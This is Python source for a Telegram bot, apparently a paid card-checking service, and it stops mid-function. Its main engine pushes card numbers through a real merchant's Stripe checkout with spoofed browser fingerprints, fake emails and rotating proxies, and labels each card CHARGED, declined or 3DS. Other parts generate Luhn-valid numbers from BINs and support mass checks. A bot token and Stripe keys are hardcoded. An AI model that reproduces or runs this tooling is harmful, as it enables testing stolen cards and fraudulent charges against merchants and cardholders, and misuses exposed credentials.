import asyncio
import logging
import random
import re
import string
import urllib.parse
import uuid
import json
import os
import time
import psutil
import platform
import sys
from datetime import datetime
from io import BytesIO
from typing import Dict, List, Optional, Tuple, Any
from collections import OrderedDict
import string as string_module

import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters

# ============================================================
# CONFIGURATION
# ============================================================

BOT_TOKEN = "8250378472:AAFH_JgQVbOUnCUvYQaOnLMnrWi4G_MCDZY"
ADMIN_ID = 6936293942
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

DEFAULT_BUY_URL = "https://buy.stripe.com/28o2apdMBcTa69G3cf"
DEFAULT_PAYMENT_LINK_ID = DEFAULT_BUY_URL.rstrip("/").split("/")[-1]

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0"
)

# ============================================================
# FONT SYSTEM
# ============================================================

FONT_MAP = {
    'a': '𝗮', 'b': '𝗯', 'c': '𝗰', 'd': '𝗱', 'e': '𝗲',
    'f': '𝗳', 'g': '𝗴', 'h': '𝗵', 'i': '𝗶', 'j': '𝗷',
    'k': '𝗸', 'l': '𝗹', 'm': '𝗺', 'n': '𝗻', 'o': '𝗼',
    'p': '𝗽', 'q': '𝗾', 'r': '𝗿', 's': '𝘀', 't': '𝘁',
    'u': '𝘂', 'v': '𝘃', 'w': '𝘄', 'x': '𝘅', 'y': '𝘆',
    'z': '𝘇',
    'A': '𝗔', 'B': '𝗕', 'C': '𝗖', 'D': '𝗗', 'E': '𝗘',
    'F': '𝗙', 'G': '𝗚', 'H': '𝗛', 'I': '𝗜', 'J': '𝗝',
    'K': '𝗞', 'L': '𝗟', 'M': '𝗠', 'N': '𝗡', 'O': '𝗢',
    'P': '𝗣', 'Q': '𝗤', 'R': '𝗥', 'S': '𝗦', 'T': '𝗧',
    'U': '𝗨', 'V': '𝗩', 'W': '𝗪', 'X': '𝗫', 'Y': '𝗬',
    'Z': '𝗭',
    '0': '𝟬', '1': '𝟭', '2': '𝟮', '3': '𝟯', '4': '𝟰',
    '5': '𝟱', '6': '𝟲', '7': '𝟳', '8': '𝟴', '9': '𝟵',
}

def fb(text):
    return "".join(FONT_MAP.get(ch, ch) for ch in text)

# ============================================================
# BIN DATABASE
# ============================================================

class BinDatabase:
    def __init__(self, db_file="bin_cache.json"):
        self.db_file = db_file
        self.bins = {}
        self.request_count = 0
        self.last_request_time = 0
        self.load_database()
        
    def load_database(self):
        if os.path.exists(self.db_file):
            try:
                with open(self.db_file, 'r', encoding='utf-8') as f:
                    self.bins = json.load(f)
            except:
                self.bins = {}
        else:
            self.bins = {
                "434527": {"scheme": "visa", "type": "debit", "brand": "Visa Classic", 
                          "bank": "Cooperativa Nacional De Educadores", "country": "Costa Rica", "emoji": "🇨🇷"},
                "515894": {"scheme": "mastercard", "type": "credit", "brand": "Gold",
                          "bank": "Banco Cooperativo Sicoob", "country": "Brazil", "emoji": "🇧🇷"},
                "490638": {"scheme": "visa", "type": "credit", "brand": "Visa Gold",
                          "bank": "Bawag P.S.K.", "country": "Germany", "emoji": "🇩🇪"},
            }
            self.save_database()
            
    def save_database(self):
        try:
            with open(self.db_file, 'w', encoding='utf-8') as f:
                json.dump(self.bins, f, indent=4, ensure_ascii=False)
        except:
            pass
            
    def lookup(self, bin_prefix: str) -> Optional[Dict]:
        key = bin_prefix[:6]
        if key in self.bins:
            return self.bins[key]
        return None
        
    def add_bin(self, bin_prefix: str, info: Dict):
        key = bin_prefix[:6]
        if key not in self.bins:
            self.bins[key] = info
            self.save_database()
            
    def can_request_api(self) -> bool:
        now = time.time()
        if self.request_count >= 5:
            if now - self.last_request_time < 10:
                return False
            else:
                self.request_count = 0
        return True
        
    def record_api_request(self):
        self.request_count += 1
        self.last_request_time = time.time()

bin_db = BinDatabase()

def bin_lookup_with_cache(bin_num: str) -> Dict:
    cached = bin_db.lookup(bin_num[:6])
    if cached:
        return cached
        
    if not bin_db.can_request_api():
        time.sleep(2)
        
    try:
        time.sleep(random.uniform(0.3, 0.8))
        response = requests.get(
            f"https://lookup.binlist.net/{bin_num[:6]}", 
            headers={"Accept-Version": "3", "User-Agent": USER_AGENT},
            timeout=10
        )
        bin_db.record_api_request()
        
        if response.status_code == 200:
            data = response.json()
            info = {
                "scheme": data.get("scheme", "Unknown"),
                "type": data.get("type", "Unknown"),
                "brand": data.get("brand", "Unknown"),
                "country": data.get("country", {}).get("name", "Unknown"),
                "bank": data.get("bank", {}).get("name", "Unknown"),
                "emoji": data.get("country", {}).get("emoji", "")
            }
            bin_db.add_bin(bin_num[:6], info)
            return info
    except:
        pass
        
    return {"scheme": "Unknown", "type": "Unknown", "brand": "Unknown", 
           "country": "Unknown", "bank": "Unknown", "emoji": ""}

# ============================================================
# USER DATA STORAGE
# ============================================================

user_db = {}
banned_users = set()
generated_codes = {}  # {code: {"user_id": xxx, "plan": xxx, "expires": timestamp}}
stop_check = False

def get_user(user_id):
    if user_id not in user_db:
        user_db[user_id] = {
            "checks": 0, "charged": 0, "declined": 0, "_3ds": 0,
            "history": [], "registered": datetime.now().strftime("%Y-%m-%d %H:%M"),
            "plan": "Free", "points": 0, "ip": None,
        }
    return user_db[user_id]

def stop_all_checks():
    global stop_check
    stop_check = True

def reset_stop():
    global stop_check
    stop_check = False

def is_stopped():
    return stop_check

# توليد كود عشوائي
def generate_redeem_code(plan: str, days: int) -> str:
    code = "".join(random.choices(string_module.ascii_uppercase + string_module.digits, k=16))
    code = f"{code[:4]}-{code[4:8]}-{code[8:12]}-{code[12:]}"
    generated_codes[code] = {
        "plan": plan,
        "days": days,
        "created_at": time.time(),
        "expires_at": time.time() + (days * 24 * 3600),
        "used_by": None
    }
    return code

# ============================================================
# GATEWAY MANAGEMENT
# ============================================================

gateways = {
    "stripe": {
        "name": "Stripe", "url": DEFAULT_BUY_URL,
        "link_id": DEFAULT_PAYMENT_LINK_ID, "active": True,
    }
}

def add_gateway(name, url):
    link_id = url.rstrip("/").split("/")[-1]
    gateways[name.lower()] = {
        "name": name, "url": url,
        "link_id": link_id, "active": True,
    }

def remove_gateway(name):
    name = name.lower()
    if name in gateways and name != "stripe":
        del gateways[name]
        return True
    return False

# ============================================================
# PROXY MANAGEMENT
# ============================================================

proxies = []

def add_proxy(proxy_str):
    proxies.append(proxy_str)

def remove_proxy(index):
    if 0 <= index < len(proxies):
        return proxies.pop(index)
    return None

def get_proxy():
    if proxies:
        proxy = random.choice(proxies)
        return {"http": proxy, "https": proxy}
    return None

# ============================================================
# LOGGING
# ============================================================

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================================================
# COLORED BUTTONS
# ============================================================

def send_colored_buttons(chat_id, text, buttons, parse_mode="HTML"):
    keyboard = {"inline_keyboard": []}
    for row in buttons:
        keyboard_row = []
        for btn in row:
            btn_dict = {"text": btn["text"], "callback_data": btn["callback"]}
            if "style" in btn:
                btn_dict["style"] = btn["style"]
            keyboard_row.append(btn_dict)
        keyboard["inline_keyboard"].append(keyboard_row)

    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": parse_mode,
        "reply_markup": keyboard
    }
    try:
        resp = requests.post(f"{API_URL}/sendMessage", json=payload, timeout=30)
        return resp.json()
    except Exception as e:
        logger.error(f"Failed to send colored buttons: {e}")
        return None

def edit_colored_buttons(chat_id, message_id, text, buttons, parse_mode="HTML"):
    keyboard = {"inline_keyboard": []}
    for row in buttons:
        keyboard_row = []
        for btn in row:
            btn_dict = {"text": btn["text"], "callback_data": btn["callback"]}
            if "style" in btn:
                btn_dict["style"] = btn["style"]
            keyboard_row.append(btn_dict)
        keyboard["inline_keyboard"].append(keyboard_row)

    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": parse_mode,
        "reply_markup": keyboard
    }
    try:
        resp = requests.post(f"{API_URL}/editMessageText", json=payload, timeout=30)
        return resp.json()
    except Exception as e:
        logger.error(f"Failed to edit colored buttons: {e}")
        return None

def b(text, callback, style="primary"):
    return {"text": text, "callback": callback, "style": style}

def b_red(text, callback):
    return {"text": text, "callback": callback, "style": "danger"}

def b_green(text, callback):
    return {"text": text, "callback": callback, "style": "success"}

def b_blue(text, callback):
    return {"text": text, "callback": callback, "style": "primary"}

# ============================================================
# CARD ENGINE
# ============================================================

class CardEngine:
    def _rand_id(self, k=32):
        return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))

    def gen_email(self):
        domains = ["gmail.com", "outlook.com", "yahoo.com", "protonmail.com"]
        return f"user{''.join(random.choices(string.digits, k=8))}@{random.choice(domains)}"

    def parse(self, line):
        line = (line or "").strip().replace(" ", "")
        if not line: return None
        parts = line.split("|")
        if len(parts) < 4: return None
        number = parts[0].strip().replace(" ", "")
        month = parts[1].strip().zfill(2)
        year = parts[2].strip()
        if len(year) == 4: year = year[-2:]
        cvc = parts[3].strip()
        name = parts[4].strip() if len(parts) > 4 else "Card Holder"
        if not number or not month or not year or not cvc: return None
        return {"number": number, "cvc": cvc, "exp_month": month,
                "exp_year": year, "name": name or "Card Holder", "email": self.gen_email()}

    def check(self, card, gateway="stripe"):
        card_str = f"{card['number']}|{card['exp_month']}|{card['exp_year']}|{card['cvc']}"
        gw = gateways.get(gateway, gateways["stripe"])
        buy_url, pl_id = gw["url"], gw["link_id"]
        session = requests.Session()
        proxy = get_proxy()
        if proxy: 
            session.proxies.update(proxy)

        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "vi,en-US;q=0.9,en;q=0.8",
            "sec-ch-ua": '\"Not:A-Brand\";v=\"99\", \"Microsoft Edge\";v=\"145\", \"Chromium\";v=\"145\"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '\"Windows\"',
            "sec-fetch-dest": "document", "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none", "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1", "user-agent": USER_AGENT,
        }
        resp = session.get(buy_url, headers=headers)
        html = resp.text
        pk_live = None
        m = re.search(r"pk_live_[A-Za-z0-9]+", html)
        if m: pk_live = m.group(0)
        cs_id = None
        m = re.search(r"cs_live_[A-Za-z0-9]+", html)
        if m: cs_id = m.group(0)

        merchant_ui_headers = {
            "accept": "application/json", "accept-language": "vi,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://buy.stripe.com", "referer": "https://buy.stripe.com/",
            "sec-ch-ua": '\"Not:A-Brand\";v=\"99\", \"Microsoft Edge\";v=\"145\", \"Chromium\";v=\"145\"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '\"Windows\"',
            "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
            "user-agent": USER_AGENT,
        }
        pl_form = {"eid": "NA", "browser_locale": "vi", "browser_timezone": "Asia/Saigon",
                   "referrer_origin": "https://karibuwomenhome.com.au"}
        pl_resp = session.post(f"https://merchant-ui-api.stripe.com/payment-links/{pl_id}",
                               headers=merchant_ui_headers, data=urllib.parse.urlencode(pl_form))

        checkout_session_id = cs_id
        pl_data, pl_expected_amount, pl_config_id, pl_currency = {}, None, None, "aud"
        if pl_resp.ok:
            try:
                pl_data = pl_resp.json()
                checkout_session_id = pl_data.get("session_id") or checkout_session_id
                pl_config_id = pl_data.get("config_id")
                pl_currency = pl_data.get("currency") or "aud"
                lig = pl_data.get("line_item_group") or {}
                pl_expected_amount = lig.get("total") or lig.get("due") or lig.get("subtotal")
                if pl_expected_amount is not None: pl_expected_amount = int(pl_expected_amount)
            except: pass

        if not pk_live: 
            pk_live = "pk_live_51QRg19RoxmaXTuY55nJGUChdohsr8gq6tGgVsA6viZ9l6h2UJ2UmyaqM4yng0sjiNhPImBr6XS0KXJY6nvYRVxAq00eT8UvNBF"
        if not checkout_session_id: 
            checkout_session_id = "cs_live_a1r2cbZ7xviYNl1hbdjN4HQNUw6hKvfjKdCpvKR48pVpsxvoFypXlLvkfr"

        muid = str(uuid.uuid4())
        guid = str(uuid.uuid4())
        sid = str(uuid.uuid4())
        stripe_js_id = str(uuid.uuid4())
        currency = pl_currency

        api_headers = {
            "accept": "application/json", "accept-language": "vi,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com", "priority": "u=1, i", "referer": "https://js.stripe.com/",
            "sec-ch-ua": '\"Not:A-Brand\";v=\"99\", \"Microsoft Edge\";v=\"145\", \"Chromium\";v=\"145\"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '\"Windows\"',
            "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
            "user-agent": USER_AGENT,
        }
        es_params = {
            "client_betas[0]": "google_pay_beta_1",
            "client_betas[1]": "disable_deferred_intent_client_validation_beta_1",
            "client_betas[2]": "blocked_card_brands_beta_2",
            "deferred_intent[mode]": "payment",
            "deferred_intent[amount]": str(pl_expected_amount) if pl_expected_amount else "100",
            "deferred_intent[currency]": currency,
            "deferred_intent[payment_method_types][0]": "card",
            "deferred_intent[payment_method_types][1]": "link",
            "deferred_intent[capture_method]": "automatic_async",
            "currency": currency, "key": pk_live, "elements_init_source": "payment_link",
            "hosted_surface": "checkout", "referrer_host": "buy.stripe.com",
            "stripe_js_id": stripe_js_id, "locale": "vi", "type": "deferred_intent",
            "checkout_session_id": checkout_session_id,
        }
        response_es = session.get("https://api.stripe.com/v1/elements/sessions", params=es_params, headers=api_headers)
        es_data = response_es.json()
        expected_amount_cents = pl_expected_amount
        if expected_amount_cents is None:
            sess = es_data.get("session") or es_data
            expected_amount_cents = sess.get("amount_total") or sess.get("amount_subtotal") or es_data.get("amount")
        if expected_amount_cents is None: expected_amount_cents = 100
        expected_amount_cents = int(expected_amount_cents)
        expected_amount_str = str(expected_amount_cents)

        buy_headers = {**api_headers, "origin": "https://buy.stripe.com", "referer": "https://buy.stripe.com/"}
        form_pm = {
            "type": "card", "card[number]": card["number"], "card[cvc]": card["cvc"],
            "card[exp_month]": card["exp_month"], "card[exp_year]": card["exp_year"],
            "billing_details[name]": card["name"], "billing_details[email]": card["email"],
            "billing_details[address][country]": "US", "guid": guid, "muid": muid, "sid": sid,
            "key": pk_live, "payment_user_agent": "stripe.js/148043f9d7; stripe-js-v3/148043f9d7; payment-link; checkout",
            "client_attribution_metadata[client_session_id]": stripe_js_id,
            "client_attribution_metadata[checkout_session_id]": checkout_session_id,
            "client_attribution_metadata[merchant_integration_source]": "checkout",
            "client_attribution_metadata[merchant_integration_version]": "payment_link",
            "client_attribution_metadata[payment_method_selection_flow]": "automatic",
            "client_attribution_metadata[checkout_config_id]": pl_config_id or "",
        }
        response_pm = session.post("https://api.stripe.com/v1/payment_methods", headers=buy_headers, data=urllib.parse.urlencode(form_pm))
        pm_resp = response_pm.json()
        if pm_resp.get("error"): 
            return card_str, False, f"Error: {pm_resp['error'].get('message')}", False
        pm_id = pm_resp.get("id")
        if not pm_id: 
            return card_str, False, "Failed to create PaymentMethod", False

        init_checksum = self._rand_id(32)
        js_checksum = "".join(random.choices(string.ascii_letters + string.digits + "~^=[]|%#{}<>?`", k=50))
        pxvid = str(uuid.uuid4())
        rv_timestamp = "".join(random.choices(string.ascii_letters + string.digits + "&%=<>^`[];", k=120))

        confirm_form = {
            "eid": "NA", "payment_method": pm_id, "expected_amount": expected_amount_str,
            "last_displayed_line_item_group_details[subtotal]": expected_amount_str,
            "last_displayed_line_item_group_details[total_exclusive_tax]": "0",
            "last_displayed_line_item_group_details[total_inclusive_tax]": "0",
            "last_displayed_line_item_group_details[total_discount_amount]": "0",
            "last_displayed_line_item_group_details[shipping_rate_amount]": "0",
            "expected_payment_method_type": "card", "guid": guid, "muid": muid, "sid": sid,
            "key": pk_live, "version": "148043f9d7", "init_checksum": init_checksum,
            "js_checksum": js_checksum, "pxvid": pxvid, "passive_captcha_token": "",
            "passive_captcha_ekey": pl_data.get("site_key", ""), "rv_timestamp": rv_timestamp,
            "client_attribution_metadata[client_session_id]": stripe_js_id,
            "client_attribution_metadata[checkout_session_id]": checkout_session_id,
            "client_attribution_metadata[merchant_integration_source]": "checkout",
            "client_attribution_metadata[merchant_integration_version]": "payment_link",
            "client_attribution_metadata[payment_method_selection_flow]": "automatic",
            "client_attribution_metadata[checkout_config_id]": pl_config_id or "",
        }
        confirm_resp = session.post(f"https://api.stripe.com/v1/payment_pages/{checkout_session_id}/confirm",
                                    headers=buy_headers, data=urllib.parse.urlencode(confirm_form, safe=""))
        data = confirm_resp.json()

        if confirm_resp.status_code == 200 and isinstance(data.get("id"), str) and data["id"].startswith("ppage_"):
            return card_str, False, "3DS Required - Possible OTP", False
        err = data.get("error") or {}
        if err:
            message = err.get("message", "Your card was declined.")
            if err.get("charge") and ("succeeded" in str(data.get("status", "")).lower()):
                return card_str, True, "CHARGED", True
            return card_str, False, message, False
        if data.get("status") in ("succeeded", "complete"): 
            return card_str, True, "CHARGED", True
        return card_str, False, "Unknown response", False

engine = CardEngine()

# ============================================================
# CARD GENERATOR
# ============================================================

def luhn_check(num):
    digits = [int(d) for d in num]
    odd, even = digits[-1::-2], digits[-2::-2]
    total = sum(odd)
    for d in even:
        d *= 2
        if d > 9: d -= 9
        total += d
    return total % 10 == 0

def gen_card_from_bin(bin_prefix, count=10):
    results = []
    for _ in range(count):
        card = bin_prefix
        while len(card) < 15: 
            card += str(random.randint(0, 9))
        for check in range(10):
            test = card + str(check)
            if luhn_check(test): 
                results.append(test)
                break
    return results

# ============================================================
# UI BUILDERS
# ============================================================

def build_main_menu():
    return [
        [b_blue(fb("Tools"), "tools")],
        [b_blue(fb("Profile"), "profile")],
        [b_blue(fb("Settings"), "settings")],
        [b_blue(fb("About"), "about")],
        [b_red(fb("Admin Panel"), "admin_panel")],  # زر المطور
    ]

def build_admin_menu():
    return [
        [b_green(fb("Generate Code"), "admin_gen")],
        [b_red(fb("Ban User"), "admin_ban")],
        [b_blue(fb("List Users"), "admin_list")],
        [b_blue(fb("Bot Speed"), "admin_speed")],
        [b_blue(fb("Bot Stats"), "admin_stats")],
        [b_red(fb("Broadcast"), "admin_broadcast")],
        [b_blue(fb("Backup"), "admin_backup")],
        [b_blue(fb("Restart"), "admin_restart")],
        [b_blue(fb("Back"), "menu")],
    ]

def build_tools_menu():
    return [
        [b_green(fb("Single Check"), "tool_chk")],
        [b_green(fb("Mass Check"), "tool_mass")],
        [b_green(fb("BIN Lookup"), "tool_bin")],
        [b_green(fb("Generator"), "tool_gen")],
        [b_blue(fb("Back"), "menu")],
    ]

def build_settings_menu():
    return [
        [b_blue(fb("Shopify"), "gw_shopify")],
        [b_blue(fb("3DS Lookup"), "gw_3ds")],
        [b_blue(fb("Site Management"), "gw_site")],
        [b_blue(fb("Proxy Management"), "gw_proxy")],
        [b_blue(fb("Other"), "gw_other")],
        [b_blue(fb("Back"), "menu")],
    ]

# ============================================================
# ADMIN COMMANDS
# ============================================================

async def cmd_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """توليد كود للمستخدمين - /code plan days"""
    user_id = update.effective_user.id
    if str(user_id) != str(ADMIN_ID):
        await update.message.reply_text(fb("Admin only!"))
        return
    
    if len(context.args) < 2:
        await update.message.reply_text(f"{fb('Usage')}: /code Premium 30\n/free 10\n/vip 90")
        return
    
    plan = context.args[0]
    days = int(context.args[1])
    
    code = generate_redeem_code(plan, days)
    
    text = f"""
{fb('Code Generated Successfully!')}
━━━━━━━━━━━━━━
{fb('Code')}: <code>{code}</code>
{fb('Plan')}: {plan}
{fb('Days')}: {days}
{fb('Expires')}: {datetime.fromtimestamp(time.time() + (days * 86400)).strftime('%Y-%m-%d')}
━━━━━━━━━━━━━━
{fb('Share this code with users.')}
"""
    await update.message.reply_text(text, parse_mode="HTML")

async def cmd_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """حظر مستخدم - /ban user_id"""
    user_id = update.effective_user.id
    if str(user_id) != str(ADMIN_ID):
        await update.message.reply_text(fb("Admin only!"))
        return
    
    if len(context.args) < 1:
        await update.message.reply_text(f"{fb('Usage')}: /ban 123456789")
        return
    
    target_id = int(context.args[0])
    banned_users.add(target_id)
    
    await update.message.reply_text(f"{fb('User banned')}: <code>{target_id}</code>", parse_mode="HTML")
    
    # محاولة إبلاغ المستخدم
    try:
        await context.bot.send_message(target_id, f"{fb('You have been banned from using this bot.')}")
    except:
        pass

async def cmd_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """رفع الحظر عن مستخدم - /unban user_id"""
    user_id = update.effective_user.id
    if str(user_id) != str(ADMIN_ID):
        await update.message.reply_text(fb("Admin only!"))
        return
    
    if len(context.args) < 1:
        await update.message.reply_text(f"{fb('Usage')}: /unban 123456789")
        return
    
    target_id = int(context.args[0])
    if target_id in banned_users:
        banned_users.remove(target_id)
        await update.message.reply_text(f"{fb('User unbanned')}: <code>{target_id}</code>", parse_mode="HTML")
    else:
        await update.message.reply_text(f"{fb('User not found in ban list')}")

async def cmd_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """عرض قائمة المستخدمين المتصلين - /list"""
    user_id = update.effective_user.id
    if str(user_id) != str(ADMIN_ID):
        await update.message.reply_text(fb("Admin only!"))
        return
    
    if not user_db:
        await update.message.reply_text(fb("No users found."))
        return
    
    text = f"{fb('Connected Users')} ({len(user_db)}):\n━━━━━━━━━━━━━━\n"
    for uid, data in user_db.items():
        status = "🔴 Banned" if uid in banned_users else "🟢 Active"
        text += f"ID: <code>{uid}</code> | {data['plan']} | {status}\n"
        text += f"Checks: {data['checks']} | Charged: {data['charged']}\n━━━━━━━━━━━━━━\n"
    
    # تقسيم النص إذا كان طويلاً
    if len(text) > 4000:
        text = text[:4000]
    
    await update.message.reply_text(text, parse_mode="HTML")

async def cmd_speed(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """فحص سرعة البوت - /speed"""
    user_id = update.effective_user.id
    if str(user_id) != str(ADMIN_ID):
        await update.message.reply_text(fb("Admin only!"))
        return
    
    start_time = time.time()
    msg = await update.message.reply_text(fb("Testing bot speed..."))
    end_time = time.time()
    
    ping = (end_time - start_time) * 1000
    
    # اختبار API
    api_start = time.time()
    try:
        requests.get("https://api.telegram.org/bot" + BOT_TOKEN + "/getMe", timeout=5)
        api_ping = (time.time() - api_start) * 1000
    except:
        api_ping = "Failed"
    
    text = f"""
{fb('Bot Speed Test Results')}
━━━━━━━━━━━━━━
{fb('Message Response')}: <b>{ping:.2f} ms</b>
{fb('Telegram API')}: <b>{api_ping:.2f} ms</b> if type(api_ping) != str else 'Failed'
{fb('Server Time')}: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━
{fb('Status')}: {'🟢 Excellent' if ping < 500 else '🟡 Good' if ping < 1000 else '🔴 Slow'}
"""
    await msg.edit_text(text, parse_mode="HTML")

async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """إحصائيات البوت - /stats"""
    user_id = update.effective_user.id
    if str(user_id) != str(ADMIN_ID):
        await update.message.reply_text(fb("Admin only!"))
        return
    
    total_users = len(user_db)
    total_checks = sum(u["checks"] for u in user_db.values())
    total_charged = sum(u["charged"] for u in user_db.values())
    total_declined = sum(u["declined"] for u in user_db.values())
    total_3ds = sum(u["_3ds"] for u in user_db.values())
    banned_count = len(banned_users)
    
    # إحصائيات النظام
    cpu_percent = psutil.cpu_percent()
    memory_percent = psutil.virtual_memory().percent
    disk_percent = psutil.disk_usage('/').percent
    
    text = f"""
{fb('Bot Statistics')}
━━━━━━━━━━━━━━
{fb('Users')}:
├─ Total: {total_users}
├─ Banned: {banned_count}
└─ Active: {total_users - banned_count}

{fb('Checks')}:
├─ Total: {total_checks}
├─ Charged: {total_charged}
├─ Declined: {total_declined}
└─ 3DS: {total_3ds}

{fb('Success Rate')}: {(total_charged/total_checks*100):.1f}% if total_checks > 0 else 0%

{fb('System')}:
├─ CPU: {cpu_percent}%
├─ RAM: {memory_percent}%
└─ Disk: {disk_percent}%

{fb('Uptime')}: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
    await update.message.reply_text(text, parse_mode="HTML")

async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """إرسال رسالة لجميع المستخدمين - /broadcast message"""
    user_id = update.effective_user.id
    if str(user_id) != str(ADMIN_ID):
        await update.message.reply_text(fb("Admin only!"))
        return
    
    if not context.args:
        await update.message.reply_text(f"{fb('Usage')}: /broadcast Hello everyone!")
        return
    
    message = " ".join(context.args)
    sent = 0
    failed = 0
    
    status_msg = await update.message.reply_text(fb("Broadcasting..."))
    
    for uid in user_db:
        if uid in banned_users:
            continue
        try:
            await context.bot.send_message(uid, f"{fb('📢 Announcement')}\n\n{message}", parse_mode="HTML")
            sent += 1
            await asyncio.sleep(0.1)
        except:
            failed += 1
    
    await status_msg.edit_text(f"{fb('Broadcast Complete')}\n✅ Sent: {sent}\n❌ Failed: {failed}")

async def cmd_backup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """عمل نسخة احتياطية - /backup"""
    user_id = update.effective_user.id
    if str(user_id) != str(ADMIN_ID):
        await update.message.reply_text(fb("Admin only!"))
        return
    
    # عمل نسخة من user_db
    backup_data = {
        "users": user_db,
        "banned": list(banned_users),
        "gateways": gateways,
        "timestamp": datetime.now().isoformat()
    }
    
    backup_file = BytesIO(json.dumps(backup_data, indent=4).encode())
    backup_file.name = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    
    await update.message.reply_document(
        document=InputFile(backup_file),
        caption=f"{fb('Backup created successfully!')}\n{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )

async def cmd_restart(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """إعادة تشغيل البوت - /restart"""
    user_id = update.effective_user.id
    if str(user_id) != str(ADMIN_ID):
        await update.message.reply_text(fb("Admin only!"))
        return
    
    await update.message.reply_text(fb("🔄 Restarting bot..."))
    logger.info("Bot restarting by admin command")
    
    # إعادة التشغيل
    os.execl(sys.executable, sys.executable, *sys.argv)

async def cmd_clear(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """مسح جميع البيانات - /clear"""
    user_id = update.effective_user.id
    if str(user_id) != str(ADMIN_ID):
        await update.message.reply_text(fb("Admin only!"))
        return
    
    global user_db, banned_users, generated_codes
    user_db = {}
    banned_users = set()
    generated_codes = {}
    
    await update.message.reply_text(fb("All data cleared successfully!"))

# ============================================================
# REGULAR COMMANDS
# ============================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # التحقق من الحظر
    if user_id in banned_users:
        await update.message.reply_text(fb("You are banned from using this bot."))
        return
    
    user = update.effective_user
    get_user(user.id)
    username = f"@{user.username}" if user.username else "N/A"
    plan = get_user(user.id)["plan"]
    if user.id == ADMIN_ID: plan = "Admin"

    text = f"""{fb('Welcome')} {user.first_name}!
━━━━━━━━━━━━━━
{fb('User')}: {username}
{fb('ID')}: <code>{user.id}</code>
{fb('Status')}: {fb(plan)}
━━━━━━━━━━━━━━
{fb('Use the buttons below to navigate.')}"""

    send_colored_buttons(update.effective_chat.id, text, build_main_menu())

async def cmd_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """استخدام كود - /redeem CODE"""
    user_id = update.effective_user.id
    
    if user_id in banned_users:
        await update.message.reply_text(fb("You are banned!"))
        return
    
    if not context.args:
        await update.message.reply_text(f"{fb('Usage')}: /redeem XXXX-XXXX-XXXX-XXXX")
        return
    
    code = context.args[0].upper()
    
    if code in generated_codes:
        code_data = generated_codes[code]
        
        # التحقق من صلاحية الكود
        if time.time() > code_data["expires_at"]:
            await update.message.reply_text(fb("Code has expired!"))
            return
        
        if code_data["used_by"] is not None:
            await update.message.reply_text(fb("Code already used!"))
            return
        
        # تفعيل الكود
        user = get_user(user_id)
        user["plan"] = code_data["plan"]
        generated_codes[code]["used_by"] = user_id
        
        await update.message.reply_text(
            f"{fb('Code redeemed successfully!')}\n"
            f"{fb('Plan')}: {code_data['plan']}\n"
            f"{fb('Valid for')}: {code_data['days']} days"
        )
    else:
        await update.message.reply_text(fb("Invalid code!"))

async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in banned_users:
        await update.message.reply_text(fb("You are banned!"))
        return
    
    udata = get_user(user_id)
    if not context.args:
        await update.message.reply_text(f"{fb('Usage')}: <code>/chk cc|mm|yyyy|cvv</code>", parse_mode="HTML")
        return
    line = " ".join(context.args)
    card = engine.parse(line)
    if not card:
        await update.message.reply_text(f"{fb('Invalid format!')}\n{fb('Use')}: <code>cc|mm|yyyy|cvv</code>", parse_mode="HTML")
        return

    status_msg = await update.message.reply_text(f"{fb('Checking...')}\n<code>{line}</code>", parse_mode="HTML")
    try:
        card_str, success, msg, charged = engine.check(card)
        udata["checks"] += 1

        bin_info = bin_lookup_with_cache(card['number'])
        bin_scheme = bin_info.get('scheme', 'Unknown')
        bin_type = bin_info.get('type', 'Unknown')
        bin_brand = bin_info.get('brand', 'Unknown')
        bin_country = bin_info.get('country', 'Unknown')
        bin_bank = bin_info.get('bank', 'Unknown')
        bin_emoji = bin_info.get('emoji', '')

        if success:
            udata["charged"] += 1
            status_text = "CHARGED!"
            status_icon = "[+]"
            response_text = "APPROVED"
        elif "3DS" in msg:
            udata["_3ds"] += 1
